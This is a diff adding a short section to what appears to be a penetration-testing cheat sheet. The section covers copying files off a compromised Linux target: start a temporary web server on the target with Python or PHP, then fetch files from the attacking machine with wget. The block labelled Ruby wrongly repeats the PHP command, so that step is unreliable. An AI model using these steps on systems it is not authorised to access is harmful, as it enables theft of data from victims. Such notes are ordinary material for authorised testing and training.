@@ -455,6 +455,37 @@ put <LOCAL FILE>
 ```
 
 </details>
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Alternative Web File Transfer Method</h3></summary>
+A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server.
+
+**Target machine: Creating a Web Server with Python3**  
+```bash
+python3 -m http.server
+```
+
+**Target machine: Creating a Web Server with Python2.7**  
+```bash
+python2.7 -m SimpleHTTPServer
+```
+
+**Target machine: Creating a Web Server with PHP**  
+```bash
+php -S 0.0.0.0:8000
+```
+
+**Target machine: Creating a Web Server with Ruby**  
+```bash
+php -S 0.0.0.0:8000
+```
+
+**Attacking machine: Download the File from the Target Machine**  
+```bash
+wget <IP>:8000/<FILE>
+```
+
+</details>
 </details>
 </details>
 
